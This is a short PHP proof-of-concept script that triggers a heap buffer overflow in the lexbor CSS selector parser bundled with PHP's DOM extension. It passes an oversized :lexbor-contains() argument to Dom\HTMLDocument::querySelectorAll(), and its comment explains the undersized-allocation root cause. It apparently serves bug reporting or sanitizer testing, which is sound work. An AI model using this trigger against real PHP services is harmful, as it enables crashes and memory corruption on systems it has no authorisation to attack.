<?php
/**
 * Trigger: heap buffer overflow in the bundled lexbor CSS selector parser via
 * the :lexbor-contains("...") pseudo-class, reached from
 * Dom\HTMLDocument::querySelectorAll().
 *
 * Root cause (ext/dom/lexbor/lexbor/css/selectors/pseudo_state.c,
 *   lxb_css_selectors_state_pseudo_class_function_lexbor_contains):
 *     str->data = lexbor_mraw_alloc(parser->memory->mraw, sizeof(lexbor_str_t)); // 16B
 *     memcpy(str->data, data, length + 1);   // copies attacker length+1 bytes
 *
 * lexbor_mraw is a pool allocator, so ASan only trips once the write runs off
 * the end of the whole pool CHUNK (the ASan report shows a ~4104-byte region).
 * A large argument guarantees we exceed the chunk redzone.
 */
$len = (int)($argv[1] ?? 16384);

$doc = Dom\HTMLDocument::createFromString(
    '<html><body><p class="test">Hello world</p></body></html>',
    LIBXML_NOERROR
);

$payload = str_repeat('A', $len);
fwrite(STDERR, "[*] :lexbor-contains() argument length = {$len}\n");

$result = $doc->querySelectorAll(':lexbor-contains("' . $payload . '")');

// Only reached if no overflow / no ASan abort.
fwrite(STDERR, "[*] no crash; matched " . $result->length . " nodes\n");
